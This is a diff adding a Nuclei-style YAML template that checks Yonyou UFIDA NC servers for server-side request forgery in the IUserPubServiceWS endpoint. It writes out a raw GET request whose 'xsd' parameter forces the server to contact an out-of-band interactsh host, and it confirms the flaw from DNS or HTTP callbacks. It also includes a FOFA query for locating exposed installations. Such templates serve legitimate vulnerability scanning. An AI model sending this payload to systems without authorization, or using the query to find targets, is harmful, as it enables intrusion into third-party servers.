@@ -1,0 +1,26 @@
+id: yonyou-nc-IUserPubServiceWS-ssrf
+info:
+  name: 用友 UFIDA NC IUserPubServiceWS - ssrf
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou,ssrf,nc,oa,oob
+
+http:
+  - raw:
+      - |
+        GET /uapws/service/nc.pubitf.rbac.IUserPubServiceWS?xsd=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
